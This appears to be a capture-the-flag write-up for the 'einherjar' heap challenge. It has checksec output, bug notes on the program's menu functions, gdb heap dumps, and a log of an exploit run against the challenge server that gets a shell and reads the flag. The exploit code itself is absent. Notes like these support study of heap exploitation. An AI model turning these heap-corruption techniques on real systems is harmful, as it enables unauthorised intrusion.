gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial

1) Add
2) Delete
3) Edit
4) View
5) Change author
6) Exit
>> 

author @ 0x5555557560a0
table  @ 0x5555557560a8
sizes  @ 0x5555557560b0

*author = malloc(0x64)
*table = malloc(0x50)
*sizes = malloc(0x28)


Add
===
- *table[idx] = malloc(size)
- *sizes[idx] = size 

[?] can overwrite previous *table[idx] and *sizes[idx] entries

Delete
======
- free(*table[idx])
- *table[idx] = 0x0

[!] doesn't null *sizes[idx]

Edit
====
- read(0, *table[idx], *sizes[idx])

View
====
- prints out all *table[idx] for idx from 0-9 

 

View
====
can leak!
 

Change_Author
=============
- read(*author,64)


Flip (choice = 1337)
====
- flip 1 bit





gdb-peda$ x/32xg 0x0000555555757010-0x10
0x555555757000: 0x0000000000000000      0x0000000000000071 <-- author
0x555555757010: 0x0000000000000000      0x0000000000000000
0x555555757020: 0x0000000000000000      0x0000000000000000
0x555555757030: 0x0000000000000000      0x0000000000000000
0x555555757040: 0x0000000000000000      0x0000000000000000
0x555555757050: 0x0000000000000000      0x0000000000000000
0x555555757060: 0x0000000000000000      0x0000000000000000
0x555555757070: 0x0000000000000000      0x0000000000000061 <-- table
0x555555757080: 0x0000000000000000      0x0000000000000000
0x555555757090: 0x0000000000000000      0x0000000000000000
0x5555557570a0: 0x0000000000000000      0x0000000000000000
0x5555557570b0: 0x0000000000000000      0x0000000000000000
0x5555557570c0: 0x0000000000000000      0x0000000000000000
0x5555557570d0: 0x0000000000000000      0x0000000000000031 <-- sizes
0x5555557570e0: 0x0000000000000000      0x0000000000000000
0x5555557570f0: 0x0000000000000000      0x0000000000000000



gdb-peda$ x/100xg 0x0000555555757000
0x555555757000: 0x0000000000000000      0x0000000000000071
0x555555757010: 0x4141414141414141      0x4141414141414141
0x555555757020: 0x4141414141414141      0x4141414141414141
0x555555757030: 0x4141414141414141      0x4141414141414141
0x555555757040: 0x4141414141414141      0x4141414141414141
0x555555757050: 0x0000000000000000      0x0000000000000000
0x555555757060: 0x0000000000000000      0x0000000000000000
0x555555757070: 0x0000000000000000      0x0000000000000061
0x555555757080: 0x0000555555757110      0x0000555555757170
0x555555757090: 0x0000000000000000      0x0000000000000000
0x5555557570a0: 0x0000000000000000      0x0000000000000000
0x5555557570b0: 0x0000000000000000      0x0000000000000000
0x5555557570c0: 0x0000000000000000      0x0000000000000000
0x5555557570d0: 0x0000000000000000      0x0000000000000031
0x5555557570e0: 0x000000c800000050      0x0000000000000000
0x5555557570f0: 0x0000000000000000      0x0000000000000000
0x555555757100: 0x0000000000000000      0x0000000000000061
0x555555757110: 0x0000414141414141      0x0000000000000000
0x555555757120: 0x0000000000000000      0x0000000000000000
0x555555757130: 0x0000000000000000      0x0000000000000000
0x555555757140: 0x0000000000000000      0x0000000000000000
0x555555757150: 0x0000000000000000      0x0000000000000000
0x555555757160: 0x0000000000000000      0x00000000000000d1
0x555555757170: 0x0000424242424242      0x0000000000000000
0x555555757180: 0x0000000000000000      0x0000000000000000
0x555555757190: 0x0000000000000000      0x0000000000000000
0x5555557571a0: 0x0000000000000000      0x0000000000000000
0x5555557571b0: 0x0000000000000000      0x0000000000000000
0x5555557571c0: 0x0000000000000000      0x0000000000000000
0x5555557571d0: 0x0000000000000000      0x0000000000000000
0x5555557571e0: 0x0000000000000000      0x0000000000000000
0x5555557571f0: 0x0000000000000000      0x0000000000000000
0x555555757200: 0x0000000000000000      0x0000000000000000
0x555555757210: 0x0000000000000000      0x0000000000000000
0x555555757220: 0x0000000000000000      0x0000000000000000
0x555555757230: 0x0000000000000000      0x0000000000020dd1
0x555555757240: 0x0000000000000000      0x0000000000000000
0x555555757250: 0x0000000000000000      0x0000000000000000
0x555555757260: 0x0000000000000000      0x0000000000000000
0x555555757270: 0x0000000000000000      0x0000000000000000
0x555555757280: 0x0000000000000000      0x0000000000000000
0x555555757290: 0x0000000000000000      0x0000000000000000
0x5555557572a0: 0x0000000000000000      0x0000000000000000
0x5555557572b0: 0x0000000000000000      0x0000000000000000
0x5555557572c0: 0x0000000000000000      0x0000000000000000
0x5555557572d0: 0x0000000000000000      0x0000000000000000
0x5555557572e0: 0x0000000000000000      0x0000000000000000
0x5555557572f0: 0x0000000000000000      0x0000000000000000
0x555555757300: 0x0000000000000000      0x0000000000000000
0x555555757310: 0x0000000000000000      0x0000000000000000



âžœ  buttercup python solve.py 35.185.71.31 8888
[*] For remote: solve.py HOST PORT
[+] Opening connection to 35.185.71.31 on port 8888: Done
[+] heap_base: 0x556a21e9a000
[+] libc_base: 0x7f6ce8d09000
[*] Switching to interactive mode

*** Error in `./einherjar': double free or corruption (!prev): 0x0000556a21e9a550 ***
$ id
uid=1002(einherjar) gid=1003(einherjar) groups=1003(einherjar)
$ ls
einherjar
flag
libc.so.6
start_chall.sh
$ cat flag
inctf{nulls_nulls_3v3rywh3r3}

